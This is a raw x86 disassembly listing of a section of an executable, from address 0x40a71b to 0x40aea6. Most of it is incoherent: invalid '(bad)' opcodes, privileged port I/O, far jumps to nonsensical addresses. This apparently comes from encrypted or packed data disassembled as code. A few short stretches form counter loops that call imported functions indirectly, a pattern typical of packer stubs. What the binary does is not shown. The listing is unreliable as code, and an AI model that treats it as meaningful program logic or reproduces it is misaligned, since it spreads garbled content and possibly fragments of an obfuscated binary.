  40a71b:	enter  0xfdd5,0x95
  40a71f:	jbe    0x40a793
  40a721:	enter  0xf8dd,0x5
  40a725:	dec    ecx
  40a726:	pop    esi
  40a727:	cdq    
  40a728:	aad    0xa4
  40a72a:	in     al,0xb2
  40a72c:	aam    0x2f
  40a72e:	adc    al,0xb
  40a730:	jle    0x40a6fc
  40a732:	jb     0x40a6f4
  40a734:	jnp    0x40a6f1
  40a736:	aas    
  40a737:	retf   
  40a738:	xchg   edi,eax
  40a739:	fmul   DWORD PTR [edi-0x721730b6]
  40a73f:	jne    0x40a79f
  40a741:	mov    ecx,0xb2aa5f9c
  40a746:	pop    ss
  40a747:	ds xor eax,0xde625b4a
  40a74d:	or     bh,BYTE PTR [ecx+0x7f]
  40a750:	(bad)  
  40a751:	aam    0xe8
  40a753:	stos   BYTE PTR es:[edi],al
  40a754:	sub    al,0x24
  40a756:	jns    0x40a70a
  40a758:	outs   dx,BYTE PTR ds:[esi]
  40a759:	test   al,0x45
  40a75b:	inc    edi
  40a75c:	pop    esp
  40a75d:	cdq    
  40a75e:	sbb    bl,BYTE PTR [esi-0x2a3c924e]
  40a764:	popf   
  40a765:	dec    edi
  40a766:	outs   dx,DWORD PTR ds:[esi]
  40a767:	daa    
  40a768:	mov    dl,0x80
  40a76a:	mov    ah,0xfd
  40a76c:	mov    WORD PTR [ebx],?
  40a76e:	neg    BYTE PTR [edi+0x343db59a]
  40a774:	adc    al,BYTE PTR [ebx-0x56597f1]
  40a77a:	and    DWORD PTR [ebp+edi*1+0x31],0x315298cb
  40a782:	fild   WORD PTR [edx]
  40a784:	inc    ebx
  40a785:	sbb    ebp,esi
  40a787:	icebp  
  40a788:	dec    esi
  40a789:	xor    al,dl
  40a78b:	out    0xd8,al
  40a78d:	cld    
  40a78e:	cdq    
  40a78f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a790:	dec    ecx
  40a791:	adc    eax,0x6426a7e8
  40a797:	pushf  
  40a798:	aaa    
  40a799:	mov    al,0xd0
  40a79b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a79c:	add    DWORD PTR [eax+0x19],edi
  40a79f:	shl    DWORD PTR es:[ebx],0x75
  40a7a3:	call   0x36123147
  40a7a8:	not    esi
  40a7aa:	test   dl,bl
  40a7ac:	mov    cl,BYTE PTR [edi+0x7897fb6c]
  40a7b2:	push   cs
  40a7b3:	push   ds
  40a7b4:	shl    BYTE PTR ds:0x47b463ec,0xf0
  40a7bb:	lods   al,BYTE PTR ds:[esi]
  40a7bc:	xchg   edx,ecx
  40a7be:	call   0x5be0:0xd4442768
  40a7c5:	pop    ecx
  40a7c6:	pop    eax
  40a7c7:	jno    0x40a810
  40a7c9:	hlt    
  40a7ca:	push   0xffffffa1
  40a7cc:	nop
  40a7cd:	mov    WORD PTR [esi],es
  40a7cf:	pop    edi
  40a7d0:	dec    esi
  40a7d1:	jae    0x40a822
  40a7d3:	push   ebp
  40a7d4:	mov    eax,0x4e4ff673
  40a7d9:	adc    al,0x95
  40a7db:	cmp    DWORD PTR ss:[esi-0x4f079f4],ebp
  40a7e2:	mov    al,0xf8
  40a7e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7e5:	push   es
  40a7e6:	jmp    0x6e93eb92
  40a7eb:	daa    
  40a7ec:	js     0x40a800
  40a7ee:	jno    0x40a794
  40a7f0:	xchg   ecx,eax
  40a7f1:	xor    eax,0x7ee8290
  40a7f6:	push   ebx
  40a7f7:	and    cl,al
  40a7f9:	add    BYTE PTR [ebx+0x72663546],dh
  40a7ff:	xor    BYTE PTR [esi],ch
  40a801:	gs loope 0x40a7fd
  40a804:	mov    BYTE PTR [ebx+0x52d0892d],bh
  40a80a:	outs   dx,BYTE PTR ds:[esi]
  40a80b:	pop    esp
  40a80c:	push   edi
  40a80d:	xchg   DWORD PTR [ebx],edi
  40a80f:	jae    0x40a7fb
  40a811:	and    al,0x5
  40a813:	fimul  WORD PTR [ebp-0x21]
  40a816:	scas   eax,DWORD PTR es:[edi]
  40a817:	ins    DWORD PTR es:[edi],dx
  40a818:	lods   eax,DWORD PTR ds:[esi]
  40a819:	out    0xe5,eax
  40a81b:	(bad)  
  40a81c:	in     eax,dx
  40a81d:	push   cs
  40a81e:	outs   dx,BYTE PTR ds:[esi]
  40a81f:	dec    esi
  40a820:	adc    bl,BYTE PTR [ebp-0x77]
  40a823:	dec    ecx
  40a824:	mov    ah,0x8a
  40a826:	xchg   ebp,eax
  40a827:	jg     0x40a897
  40a829:	stos   BYTE PTR es:[edi],al
  40a82a:	aad    0xd1
  40a82c:	push   ecx
  40a82d:	fnstenv [eax+0x661f15b7]
  40a833:	xchg   ebx,eax
  40a834:	add    BYTE PTR [ebx-0x15],dl
  40a837:	jl     0x40a80e
  40a839:	fadd   DWORD PTR [ecx-0x734ce6f]
  40a83f:	je     0x40a881
  40a841:	xchg   edx,eax
  40a842:	fidivr DWORD PTR [eax]
  40a844:	out    dx,al
  40a845:	xchg   edi,eax
  40a846:	(bad)  
  40a847:	adc    al,0xc6
  40a849:	sub    DWORD PTR ss:[edi-0x17ba723c],0xffffff89
  40a851:	inc    ebp
  40a852:	fadd   QWORD PTR [ecx+0x43045d35]
  40a858:	add    BYTE PTR [ebx],dl
  40a85a:	pop    edi
  40a85b:	add    BYTE PTR [eax],al
  40a85d:	mov    eax,DWORD PTR [ebp-0x18]
  40a860:	and    DWORD PTR ds:0x430469,0x0
  40a86a:	jmp    0x40a87c
  40a86f:	mov    ebx,DWORD PTR ds:0x430469
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x430469,ebx
  40a87c:	cmp    DWORD PTR ds:0x430469,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x430469,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e8fb
  40a89b:	call   DWORD PTR ds:0x42ec3f
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x430465,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x4304eb,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x43046d
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e7d4,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e7d4
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e7d4,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e7d4,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e7d4,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42ea07
  40a90b:	cmp    DWORD PTR ds:0x42e7d4,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e7d4
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e7d4,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx-0x65850d87],bl
  40a93e:	dec    esp
  40a93f:	cdq    
  40a940:	loope  0x40a9c0
  40a942:	jle    0x40a972
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a998
  40a948:	xor    DWORD PTR [esi-0x789a5ac7],ebp
  40a94e:	sub    eax,0xdd98821a
  40a953:	imul   ecx,DWORD PTR [edi-0x71],0xbc5253ab
  40a95a:	int3   
  40a95b:	jge    0x40a91f
  40a95d:	clc    
  40a95e:	dec    eax
  40a95f:	lock cs inc edi
  40a962:	sub    bl,BYTE PTR [ebp+0x1e]
  40a965:	test   eax,0x92c9f863
  40a96a:	daa    
  40a96b:	cmp    BYTE PTR [ecx+0x743b065a],0xfa
  40a972:	cmp    al,0x1c
  40a974:	xor    al,ch
  40a976:	mov    ebx,0x213be820
  40a97b:	sahf   
  40a97c:	jmp    0x40a91d
  40a97e:	or     eax,0xffffffea
  40a981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a982:	loope  0x40a936
  40a984:	(bad)  
  40a985:	std    
  40a986:	das    
  40a987:	mov    WORD PTR ds:0x6c7f1d27,fs
  40a98d:	jne    0x40a9cc
  40a98f:	fadd   st(7),st
  40a991:	adc    DWORD PTR [eax],eax
  40a993:	jbe    0x40a985
  40a995:	jecxz  0x40a997
  40a997:	add    al,0x2e
  40a99a:	pop    ebx
  40a99b:	rcl    BYTE PTR [eax+0x4c8bc1ea],0x15
  40a9a2:	mov    edi,0x4bd4be85
  40a9a7:	pop    edx
  40a9a8:	inc    ecx
  40a9a9:	adc    eax,0x8c42284
  40a9ae:	rcr    DWORD PTR [ebx+0x425b3689],1
  40a9b4:	add    edx,DWORD PTR ds:0xc36644b5
  40a9ba:	fnsetpm(287 only) 
  40a9bc:	jl     0x40a9a9
  40a9be:	jg     0x40a96b
  40a9c0:	imul   esp,DWORD PTR [ebx+0x6fe6c7aa],0x3940d1db
  40a9ca:	cdq    
  40a9cb:	mov    ds:0x55adece6,al
  40a9d0:	jmp    0xa507:0x748c8df0
  40a9d7:	sub    al,0xe9
  40a9d9:	mov    ebp,0x1c06a1d3
  40a9de:	jb     0x40a9af
  40a9e0:	data16 jo 0x40a9e9
  40a9e3:	(bad)  [esi+ebp*8+0x269dd04d]
  40a9ea:	adc    eax,0x6416b7cc
  40a9ef:	dec    ebx
  40a9f0:	ins    DWORD PTR es:[edi],dx
  40a9f1:	and    ecx,edi
  40a9f3:	inc    eax
  40a9f4:	jae    0x40aa41
  40a9f6:	loop   0x40a998
  40a9f8:	cmp    BYTE PTR [eax],bh
  40a9fa:	neg    BYTE PTR [ecx+0x20]
  40a9fd:	jp     0x40a99d
  40a9ff:	js     0x40aa00
  40aa01:	test   al,0x75
  40aa03:	dec    ebx
  40aa04:	stos   DWORD PTR es:[edi],eax
  40aa05:	ss sbb eax,0x62c21910
  40aa0b:	(bad)  
  40aa0c:	mov    bh,al
  40aa0e:	nop
  40aa0f:	fcomp  QWORD PTR [edi-0x2d4c870d]
  40aa15:	inc    ecx
  40aa16:	xor    bh,BYTE PTR [ebx+0x1adcd0e]
  40aa1c:	sbb    DWORD PTR [eax+0x59e245bb],ebx
  40aa22:	loop   0x40a9c3
  40aa24:	xchg   ebp,eax
  40aa25:	pop    es
  40aa26:	adc    ebx,DWORD PTR [edi+0x6a]
  40aa29:	f2xm1  
  40aa2b:	mov    WORD PTR [esp+ecx*8-0xa],cs
  40aa2f:	xor    ah,BYTE PTR [ebp+ebx*4-0x3a8e882]
  40aa36:	jo     0x40a9e1
  40aa38:	or     bl,BYTE PTR [ecx+0x48]
  40aa3b:	lea    ebx,[edx-0x43]
  40aa3e:	pusha  
  40aa3f:	cmp    al,0x49
  40aa41:	in     al,0xee
  40aa43:	(bad)  
  40aa44:	retf   
  40aa45:	pop    ecx
  40aa46:	pop    ebx
  40aa47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa48:	or     al,cl
  40aa4a:	mov    cs,WORD PTR [edi-0x42247814]
  40aa50:	rcr    BYTE PTR [ebx+eiz*2],cl
  40aa53:	popa   
  40aa54:	mov    esp,0x5de24047
  40aa59:	(bad)  
  40aa5a:	cmc    
  40aa5b:	pushf  
  40aa5c:	push   eax
  40aa5d:	push   ecx
  40aa5e:	jecxz  0x40aa35
  40aa60:	jb     0x40aa4f
  40aa62:	aad    0xaf
  40aa64:	mov    esi,0xe80dfef2
  40aa69:	mov    ss,WORD PTR [edx+0x2006b6a]
  40aa6f:	out    0x8e,eax
  40aa71:	push   esi
  40aa72:	sub    DWORD PTR [ebx],edi
  40aa74:	mov    cl,0x8a
  40aa76:	xor    esi,esp
  40aa78:	mov    ds:0x82822c81,eax
  40aa7d:	ficom  WORD PTR ds:0x7fc8d7f
  40aa83:	pop    edx
  40aa84:	aas    
  40aa85:	jmp    0xc108:0x7143a65a
  40aa8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa8e:	jb     0x40aaaa
  40aa90:	sub    BYTE PTR [ebx],0xd3
  40aa93:	inc    ebp
  40aa94:	fstp   QWORD PTR [eax+0x4c]
  40aa97:	sub    eax,0x75058d11
  40aa9c:	gs daa 
  40aa9e:	and    cl,BYTE PTR [edi-0x5e]
  40aaa1:	xchg   ecx,eax
  40aaa2:	or     dh,BYTE PTR [edi-0x35]
  40aaa5:	jle    0x40aab5
  40aaa7:	arpl   WORD PTR [edi-0x28],sp
  40aaaa:	nop
  40aaab:	ret    0x4ed1
  40aaae:	xchg   eax,ebp
  40aab0:	dec    edi
  40aab1:	jns    0x40aaf4
  40aab3:	dec    esi
  40aab4:	fist   WORD PTR [eax+0x16]
  40aab7:	test   BYTE PTR [edx+0x40],dl
  40aaba:	ret    0x4cae
  40aabd:	mov    ds:0xada9d5c4,al
  40aac2:	lahf   
  40aac3:	or     BYTE PTR [ebp+0x7ae3bd02],bl
  40aac9:	xchg   esi,eax
  40aaca:	test   eax,0x3c271ab
  40aacf:	inc    esp
  40aad0:	push   esi
  40aad1:	cmp    eax,0xa2ce4ca7
  40aad6:	pop    esi
  40aad7:	add    DWORD PTR [edx],0x968607ae
  40aadd:	or     al,0x16
  40aadf:	mov    al,ds:0xfd33d65e
  40aae4:	icebp  
  40aae5:	dec    esp
  40aae6:	lods   al,BYTE PTR ds:[esi]
  40aae7:	imul   edi,DWORD PTR [edx],0x31d8974b
  40aaed:	mov    esp,0xbb4668da
  40aaf2:	sbb    DWORD PTR [edx],edi
  40aaf4:	retf   0xf6ab
  40aaf7:	std    
  40aaf8:	mov    esp,0xe30f19d3
  40aafd:	outs   dx,DWORD PTR ds:[esi]
  40aafe:	or     BYTE PTR [edi+0x4943cdbd],0x2
  40ab05:	inc    ebp
  40ab06:	jb     0x40aab3
  40ab08:	cmp    ebx,DWORD PTR [eax-0x5fea1ac7]
  40ab0e:	sub    dh,ch
  40ab10:	mov    edx,esp
  40ab12:	dec    edi
  40ab13:	sub    DWORD PTR [esi],esi
  40ab15:	push   esp
  40ab16:	jp     0x40ab4f
  40ab18:	ret    0xb8cf
  40ab1b:	hlt    
  40ab1c:	pop    es
  40ab1d:	hlt    
  40ab1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab1f:	mov    ebp,ecx
  40ab21:	pop    eax
  40ab22:	clc    
  40ab23:	(bad)  cs:[ecx-0x54c2389b]
  40ab2a:	imul   esi,DWORD PTR [ecx+0x2f],0x6e
  40ab2e:	aad    0xef
  40ab30:	pop    ebx
  40ab31:	sbb    BYTE PTR [ebp+ebx*4-0x8af7cde],0x8a
  40ab39:	lahf   
  40ab3a:	adc    esp,esp
  40ab3c:	int    0x0
  40ab3e:	cmp    BYTE PTR ds:0x99195f91,ah
  40ab44:	xchg   edi,eax
  40ab45:	popf   
  40ab46:	mov    eax,ds:0x3de3e82
  40ab4b:	pop    ebp
  40ab4c:	inc    edx
  40ab4d:	fs cli 
  40ab4f:	push   esp
  40ab50:	out    dx,eax
  40ab51:	xor    BYTE PTR [edx],dh
  40ab53:	xchg   ebp,eax
  40ab54:	or     BYTE PTR [esi-0x42],al
  40ab57:	sar    BYTE PTR [ecx],cl
  40ab59:	push   ebp
  40ab5a:	bound  esp,QWORD PTR [ecx]
  40ab5c:	ds cli 
  40ab5e:	and    DWORD PTR [ecx],ebp
  40ab60:	sar    DWORD PTR [edx-0x4d626e27],1
  40ab66:	sbb    esi,ecx
  40ab68:	leave  
  40ab69:	in     eax,dx
  40ab6a:	mov    eax,ds:0xe72032df
  40ab6f:	xor    DWORD PTR [esi-0x3c],edx
  40ab72:	fbld   TBYTE PTR [ebp+0x133eb762]
  40ab78:	jne    0x40ab4d
  40ab7a:	scas   eax,DWORD PTR es:[edi]
  40ab7b:	lahf   
  40ab7c:	xchg   dh,ch
  40ab7e:	xchg   ebx,eax
  40ab7f:	inc    edi
  40ab80:	es mov ah,0xe0
  40ab83:	into   
  40ab84:	sub    al,0x1b
  40ab86:	or     dl,ch
  40ab88:	aaa    
  40ab89:	mov    cl,0x9d
  40ab8b:	adc    bl,BYTE PTR [ecx+edx*4+0x6f2cfcdd]
  40ab92:	or     al,0xbf
  40ab94:	nop
  40ab95:	xchg   BYTE PTR [eax-0x25],bl
  40ab98:	or     al,0xf3
  40ab9a:	inc    eax
  40ab9c:	mov    ecx,0x5e3a08e9
  40aba1:	push   es
  40aba2:	mov    cl,0x32
  40aba4:	push   es
  40aba5:	in     al,0xc8
  40aba7:	test   ecx,ecx
  40aba9:	(bad)  
  40abaa:	test   BYTE PTR [esi-0x25],0x82
  40abae:	jnp    0x40ac27
  40abb0:	xchg   esp,eax
  40abb1:	add    ch,BYTE PTR [ecx]
  40abb3:	je     0x40ab9d
  40abb5:	pusha  
  40abb6:	and    BYTE PTR [eax-0x46b349ed],0x7
  40abbd:	xor    al,0x1e
  40abbf:	add    BYTE PTR [ebx+0x45be9261],ah
  40abc5:	xchg   BYTE PTR [ecx-0x1971504],bh
  40abcb:	or     bl,BYTE PTR [esi-0x2c]
  40abce:	in     al,0xa8
  40abd0:	sbb    al,0x1e
  40abd2:	ins    DWORD PTR es:[edi],dx
  40abd3:	(bad)  
  40abd4:	int3   
  40abd5:	push   edi
  40abd6:	jns    0x40aba2
  40abd8:	jp     0x40ab87
  40abda:	pop    edi
  40abdb:	lock out dx,eax
  40abdd:	int    0xca
  40abdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abe0:	stos   BYTE PTR es:[edi],al
  40abe1:	ror    BYTE PTR [ebp-0x4],cl
  40abe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abe6:	cmp    al,0x93
  40abe8:	add    eax,0x48b6d2c9
  40abed:	and    edx,ebp
  40abef:	and    edi,DWORD PTR [edx+0x4b50c2e6]
  40abf5:	retf   0xee48
  40abf8:	(bad)  [edx]
  40abfa:	stc    
  40abfb:	stos   BYTE PTR es:[edi],al
  40abfc:	inc    ebx
  40abfd:	xor    eax,DWORD PTR ds:0x7d4d29e2
  40ac03:	cs es jle 0x40ac12
  40ac07:	(bad)  
  40ac08:	cmc    
  40ac09:	push   esi
  40ac0a:	inc    esp
  40ac0b:	and    edi,DWORD PTR [ebx-0x17]
  40ac0e:	fsub   DWORD PTR [edi-0x531a229c]
  40ac14:	sbb    bl,BYTE PTR [ebx-0x241d07af]
  40ac1a:	pop    ds
  40ac1b:	arpl   bx,ax
  40ac1d:	or     esp,DWORD PTR [edx]
  40ac1f:	or     esp,ecx
  40ac21:	scas   eax,DWORD PTR es:[edi]
  40ac22:	push   0xfffffff5
  40ac24:	fsubr  DWORD PTR ss:[edx]
  40ac27:	sub    edi,DWORD PTR [ebx-0x2a42f3d9]
  40ac2d:	and    esp,ebp
  40ac2f:	pop    esi
  40ac30:	mov    edx,0x303bb44f
  40ac35:	imul   esi,DWORD PTR [eax],0x50
  40ac38:	stos   DWORD PTR es:[edi],eax
  40ac39:	dec    esp
  40ac3a:	push   eax
  40ac3b:	sub    BYTE PTR [ebp-0x2617360a],dl
  40ac41:	les    ebp,FWORD PTR [edi-0x439d8dcb]
  40ac47:	mov    al,0x39
  40ac49:	sti    
  40ac4a:	test   esi,edi
  40ac4c:	pop    edx
  40ac4d:	jno    0x40ac3b
  40ac4f:	xor    al,0x77
  40ac51:	sar    cl,1
  40ac53:	ror    DWORD PTR [ecx-0x4a],1
  40ac56:	add    BYTE PTR [esi],0x5c
  40ac59:	sahf   
  40ac5a:	(bad)  
  40ac5b:	cli    
  40ac5c:	jo     0x40acb5
  40ac5e:	push   0xf5563358
  40ac63:	sub    al,BYTE PTR [ebx]
  40ac65:	sbb    bl,BYTE PTR [edx+0x5f]
  40ac68:	cli    
  40ac69:	xchg   ecx,eax
  40ac6a:	adc    eax,0xdbf52a7e
  40ac6f:	rcl    BYTE PTR [edx+0x44a8bcaf],0xe5
  40ac76:	ins    DWORD PTR es:[edi],dx
  40ac77:	mov    eax,ds:0x41227c
  40ac7c:	mov    ebx,0x8e12feb8
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	push   ecx
  40ac93:	sahf   
  40ac94:	ror    DWORD PTR gs:[ecx-0x14],cl
  40ac98:	jle    0x40ad18
  40ac9a:	cs jge 0x40ad1b
  40ac9d:	jle    0x40ac3d
  40ac9f:	scas   al,BYTE PTR es:[edi]
  40aca0:	jnp    0x40ac5f
  40aca2:	push   eax
  40aca3:	xlat   BYTE PTR ds:[ebx]
  40aca4:	and    BYTE PTR [ebp+0x3ebf050c],0xea
  40acab:	push   esi
  40acac:	and    DWORD PTR [edi+eax*2-0xfa0e040],ebp
  40acb3:	pop    ebx
  40acb4:	push   cs
  40acb5:	jle    0x40ad02
  40acb7:	int3   
  40acb8:	dec    edi
  40acb9:	(bad)  
  40acba:	lahf   
  40acbb:	test   dh,dh
  40acbd:	adc    al,0x4e
  40acbf:	inc    eax
  40acc0:	pop    ecx
  40acc1:	int    0x10
  40acc3:	and    dh,BYTE PTR [edx-0x37a64d78]
  40acc9:	adc    esi,DWORD PTR [esi]
  40accb:	pusha  
  40accc:	mov    ah,0xc1
  40acce:	sar    DWORD PTR [bx+di-0x68],0xa5
  40acd3:	jmp    0x40acc1
  40acd5:	mov    al,0xc1
  40acd7:	fbld   TBYTE PTR [esi]
  40acd9:	inc    esp
  40acda:	lock xor ch,0xc1
  40acde:	mov    ebx,0xeaff1354
  40ace3:	push   cs
  40ace4:	aaa    
  40ace5:	push   ds
  40ace6:	aam    0xe5
  40ace8:	or     eax,esp
  40acea:	push   ebp
  40aceb:	xor    ch,ah
  40aced:	popa   
  40acee:	pop    es
  40acef:	xlat   BYTE PTR ds:[ebx]
  40acf0:	inc    ebx
  40acf1:	pop    ebp
  40acf2:	push   ss
  40acf3:	pop    edi
  40acf4:	push   ds
  40acf5:	addr16 std 
  40acf7:	jmp    FWORD PTR [eax+edx*4-0x66]
  40acfb:	icebp  
  40acfc:	cmc    
  40acfd:	int    0x70
  40acff:	or     bh,ah
  40ad01:	jl     0x40ad81
  40ad03:	bound  ebx,QWORD PTR [ecx]
  40ad05:	fdivr  st,st(7)
  40ad07:	mov    dl,0x41
  40ad09:	lahf   
  40ad0a:	shl    DWORD PTR [edx-0x4c64c4e4],1
  40ad10:	ss test dl,ah
  40ad13:	daa    
  40ad14:	push   eax
  40ad15:	addr16 in al,0x62
  40ad18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad19:	je     0x40ad70
  40ad1b:	mov    BYTE PTR [eax],ah
  40ad1d:	or     al,0x7d
  40ad1f:	rcr    ecx,cl
  40ad21:	dec    ecx
  40ad22:	iret   
  40ad23:	arpl   WORD PTR [edi-0x5c],ax
  40ad26:	out    0xe,eax
  40ad28:	es pop es
  40ad2a:	(bad)  
  40ad2c:	ja     0x40ada3
  40ad2e:	imul   esp,DWORD PTR [ebx+0x260833d2],0xffffff98
  40ad35:	fnsave [ebp+0x56ed88bb]
  40ad3b:	das    
  40ad3c:	icebp  
  40ad3d:	ror    DWORD PTR [ecx+edi*8],1
  40ad40:	iret   
  40ad41:	mov    edx,0xa2db8e75
  40ad46:	jns    0x40adc2
  40ad48:	rcl    BYTE PTR [edi+0x6a823816],0x52
  40ad4f:	cmp    ebp,DWORD PTR [ebp-0x50883d81]
  40ad55:	inc    ebx
  40ad56:	mov    edx,0x840e128b
  40ad5b:	fild   WORD PTR [esp+edx*1]
  40ad5e:	adc    DWORD PTR [ecx+0x2b],edi
  40ad61:	xchg   edi,eax
  40ad62:	in     al,dx
  40ad63:	pop    es
  40ad64:	(bad)  
  40ad65:	in     eax,0xdd
  40ad67:	fimul  DWORD PTR [edx-0x11]
  40ad6a:	repnz inc esp
  40ad6c:	mov    al,ds:0x630d98cc
  40ad71:	sbb    ebp,DWORD PTR [edi-0x2a]
  40ad74:	pop    ebp
  40ad75:	jb     0x40ad75
  40ad77:	adc    BYTE PTR [esi-0x2cac41b5],0xbe
  40ad7e:	xor    DWORD PTR [eax],edi
  40ad80:	mov    ds:0x3afa7d98,al
  40ad85:	ret    
  40ad86:	fiadd  DWORD PTR [ebp-0x2b]
  40ad89:	fldcw  WORD PTR [esi+0x28]
  40ad8c:	fdiv   st(7),st
  40ad8e:	xor    al,ch
  40ad90:	outs   dx,BYTE PTR ds:[esi]
  40ad91:	pop    es
  40ad92:	xchg   ebp,eax
  40ad93:	pop    es
  40ad94:	popa   
  40ad95:	xor    al,0x93
  40ad98:	ficom  DWORD PTR [edx]
  40ad9a:	fadd   DWORD PTR ds:0xaec323c7
  40ada0:	enter  0xf7e2,0xcd
  40ada4:	in     eax,dx
  40ada5:	inc    esp
  40ada6:	fcmovnb st,st(7)
  40ada8:	cmp    DWORD PTR [eax+0x2f],ebp
  40adab:	and    bh,BYTE PTR [ebx+0x23f7c7e1]
  40adb1:	stos   DWORD PTR es:[edi],eax
  40adb2:	jge    0x40ad57
  40adb4:	dec    esi
  40adb5:	sahf   
  40adb6:	xchg   ecx,eax
  40adb7:	push   esi
  40adb8:	std    
  40adb9:	es cmp bh,dh
  40adbc:	sub    eax,0xea8debcd
  40adc1:	xchg   esp,eax
  40adc2:	lods   eax,DWORD PTR ds:[esi]
  40adc3:	clc    
  40adc4:	add    DWORD PTR [ecx],ecx
  40adc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adc7:	aaa    
  40adc8:	push   cs
  40adc9:	gs call 0x949be886
  40adcf:	aam    0x32
  40add1:	(bad)  [ecx+0x45]
  40add4:	push   edx
  40add5:	(bad)  
  40add6:	pop    edi
  40add7:	push   ebx
  40add8:	add    DWORD PTR [ebp+0x6c21dfd],esp
  40adde:	mov    DWORD PTR [edi+eax*2+0xe7fb81a],ebx
  40ade5:	or     eax,0x8e9c4a0c
  40adea:	je     0x40adf6
  40adec:	mov    DWORD PTR [ebx-0x17],ebp
  40adef:	scas   al,BYTE PTR es:[edi]
  40adf0:	add    al,0xba
  40adf2:	cmp    al,0x5
  40adf4:	xor    bl,0xe0
  40adf7:	push   edx
  40adf8:	(bad)  
  40adf9:	shl    dl,0x7f
  40adfc:	fcmove st,st(5)
  40adfe:	jl     0x40ae2f
  40ae00:	sub    dh,BYTE PTR [ecx-0x1e7dc012]
  40ae06:	bound  esi,QWORD PTR [ebx+ebp*1]
  40ae09:	sahf   
  40ae0a:	outs   dx,DWORD PTR ds:[esi]
  40ae0b:	jno    0x40ade8
  40ae0d:	add    cl,BYTE PTR [bx+di+0x4f]
  40ae11:	sahf   
  40ae12:	add    eax,0x95d30ae4
  40ae17:	mov    esi,0x48e7be90
  40ae1c:	dec    edx
  40ae1d:	cwde   
  40ae1e:	jae    0x40ae27
  40ae20:	(bad)  
  40ae21:	xor    al,0xdc
  40ae23:	push   ds
  40ae24:	or     al,BYTE PTR [edx+0x629cb1ab]
  40ae2a:	sub    ecx,DWORD PTR [ebx+eax*4]
  40ae2d:	add    al,BYTE PTR [eax]
  40ae2f:	pusha  
  40ae30:	ret    0xf487
  40ae33:	xchg   esi,eax
  40ae34:	popf   
  40ae35:	out    dx,eax
  40ae36:	mov    ah,0x5
  40ae38:	jmp    0x90841033
  40ae3d:	pusha  
  40ae3e:	ss sub cl,BYTE PTR gs:[eax]
  40ae42:	add    ebp,ebp
  40ae44:	sti    
  40ae45:	jge    0x40ae35
  40ae47:	cli    
  40ae48:	scas   al,BYTE PTR es:[edi]
  40ae49:	push   ecx
  40ae4a:	xchg   ebp,eax
  40ae4b:	pop    ebx
  40ae4c:	xchg   esp,eax
  40ae4e:	fcom   DWORD PTR [eax-0x478823a4]
  40ae54:	mov    dl,0xcd
  40ae56:	retf   
  40ae57:	sbb    esp,esi
  40ae59:	jecxz  0x40ae87
  40ae5b:	pop    ebx
  40ae5c:	xchg   ecx,eax
  40ae5d:	jg     0x40ae05
  40ae5f:	push   cs
  40ae60:	add    BYTE PTR [ebp-0x79],al
  40ae63:	and    eax,0x99607e9d
  40ae68:	popa   
  40ae69:	mov    ah,0x32
  40ae6b:	jmp    0x816bbdc3
  40ae70:	inc    ecx
  40ae71:	mov    esi,esp
  40ae73:	mov    dh,0x99
  40ae76:	aad    0x62
  40ae78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae79:	pavgw  mm1,mm2
  40ae7c:	sbb    ebp,edi
  40ae7e:	outs   dx,BYTE PTR ds:[esi]
  40ae7f:	loopne 0x40ae7a
  40ae81:	ss and al,0x8a
  40ae84:	xchg   ebx,eax
  40ae85:	cmp    al,0xa6
  40ae87:	or     al,0xbe
  40ae89:	xchg   esi,eax
  40ae8a:	fadd   DWORD PTR [ebx-0x73]
  40ae8d:	mov    ch,0x62
  40ae8f:	jo     0x40af09
  40ae91:	lea    edi,[esi+0x4deea859]
  40ae97:	(bad)  
  40ae98:	push   eax
  40ae99:	xchg   esi,eax
  40ae9a:	ja     0x40aea9
  40ae9c:	mov    eax,0x57733c43
  40aea1:	lods   al,BYTE PTR ds:[esi]
  40aea2:	lock push ebx
  40aea4:	int3   
  40aea5:	xchg   esi,eax
  40aea6:	lods   eax,DWORD PTR ds:[esi]
